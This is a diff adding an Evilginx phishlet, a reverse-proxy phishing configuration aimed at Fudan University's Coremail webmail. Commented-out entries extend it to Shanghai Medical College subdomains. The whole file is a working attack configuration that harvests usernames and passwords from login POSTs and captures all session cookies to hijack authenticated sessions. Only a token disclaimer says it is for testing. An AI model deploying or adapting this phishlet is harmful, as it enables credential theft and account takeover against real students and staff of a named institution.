@@ -1,0 +1,71 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+
+author: '@an0n'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'fudan.edu.cn', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'fudan.edu.cn', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ecampus', orig_sub: 'ecampus', domain: 'fudan.edu.cn', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'xxb', orig_sub: 'xxb', domain: 'fudan.edu.cn', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'xxbcrawler', orig_sub: 'xxbcrawler', domain: 'fudan.edu.cn', session: true, is_landing: false, auto_filter: false}
+#  - {phish_sub: '', orig_sub: '', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'webmail', orig_sub: 'webmail', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'swk', orig_sub: 'swk', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'cancer', orig_sub: 'cancer', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'eent', orig_sub: 'eent', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'fys', orig_sub: 'fys', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'goh', orig_sub: 'goh', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}  
+#  - {phish_sub: 'hsh', orig_sub: 'hsh', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'jsyy', orig_sub: 'jsyy', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'sci', orig_sub: 'sci', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'zsyy', orig_sub: 'zsyy', domain: 'shmu.edu.cn', session: true, is_landing: false, auto_filter: true}
+
+
+
+sub_filters:
+  - {triggers_on: 'mail.fudan.edu.cn', orig_sub: 'mail', domain: 'fudan.edu.cn', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'mail.fudan.edu.cn', orig_sub: 'xxbcrawler', domain: 'fudan.edu.cn', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+#  - {triggers_on: 'mail.fudan.edu.cn', orig_sub: '', domain: 'shmu.edu.cn', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+auth_tokens:
+  - domain: '.fudan.edu.cn'
+    keys: ['.*,regexp']
+  - domain: 'mail.fudan.edu.cn'
+    keys: ['.*,regexp']
+#  - domain: '.shmu.edu.cn'
+#    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'uid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom: 
+    - key: 'domain'
+      search: '(.*)'
+      type: 'post'
+    - key: 'locale'
+      search: '(.*)'
+      type: 'post'
+     
+
+force_post:
+  - path: '/coremail/index.jsp'
+    search:
+      - {key: 'uid', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'useSSL', value: 'true'}
+    type: 'post'
+      
+login:
+  domain: 'mail.fudan.edu.cn'
+  path: '/'
+
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
